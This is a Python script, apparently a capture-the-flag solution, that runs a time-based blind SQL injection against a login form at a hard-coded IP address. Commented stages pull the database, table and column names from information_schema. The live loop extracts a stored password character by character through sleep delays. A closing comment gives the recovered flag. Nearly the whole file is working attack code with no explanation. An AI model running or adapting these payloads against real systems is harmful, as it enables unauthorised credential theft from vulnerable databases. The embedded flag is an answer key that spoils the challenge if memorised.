import  requests
import string
import time 
# BLIND SQLI 

url = 'http://103.229.41.16:8081/'
data = {
    "username":"admin",
    "password": "1234",
    "login" : "LOGIN"
}

# brute name database 
# length_db = 5
# db_name = ''

# for k in range(5):
#     for i in string.printable:
#         payload = f"'or if((select substr((select database()),{k+1},1))='{i}',sleep(0.3),0)-- -"
#         data["username"] = payload
#         start = time.time()
#         r = requests.post(url, data=data).text
#         end = time.time()
#         if end-start >= 0.3:
#             print("FOUND {}".format(i))
#             db_name += i
#             break
#         else:
#             print("FAILED {}".format(i))
# print(db_name)

# length db = 5
# name_db = 'deweb'
# =============================================================
# brute table name 

# table_name = ''
# for k in range(100):
#     for i in string.printable:
#         payload = f"'or if((select substr((select group_concat(table_name) from information_schema.tables where table_schema='deweb'),{k+1},1))='{i}',sleep(0.5),0)-- -"
#         data["username"] = payload
#         start = time.time()
#         r = requests.post(url, data=data).text
#         end = time.time()
#         if end-start >= 0.5:
#             print("FOUND {}".format(i))
#             table_name += i
#             print(table_name)
#             break
#         else:
#             print("FAILED {}".format(i))

# =================================================================
# brute column name 

# column_name = ''
# for k in range(0,60):
#     for i in string.printable:
#         payload = f"'or if((select substr((select group_concat(column_name) from information_schema.columns where table_schema='deweb'),{k+1},1))='{i}',sleep(0.5),0)-- -"
#         data["username"] = payload
#         start = time.time()
#         r = requests.post(url, data=data).text
#         end = time.time()
#         if end-start >= 0.5:
#             print("FOUND {}".format(i))
#             column_name += i
#             print(column_name)
#             break
#         else:
#             print("FAILED {}".format(i))

#id,user,password,name,age,phone,city


# ====================================================================
s = string.ascii_uppercase + string.ascii_lowercase + string.digits + "{}_@"
password = ''
for k in range(0,200):
    for i in range(48,126):
        payload = f"'or if((select ascii(substr((select password from hocsinh where id=6),{k+1},1)))={i},sleep(0.5),0)-- -"
        data["username"] = payload
        start = time.time()
        r = requests.post(url, data=data).text
        end = time.time()
        if end-start >= 0.5:
            print("FOUND {}".format(i))
            password += chr(i)
            print(password)
            break
        else:
            print("FAILED {}".format(chr(i)))

# WhiteHat{5hOW_15_Ch1K3n_5t@r}
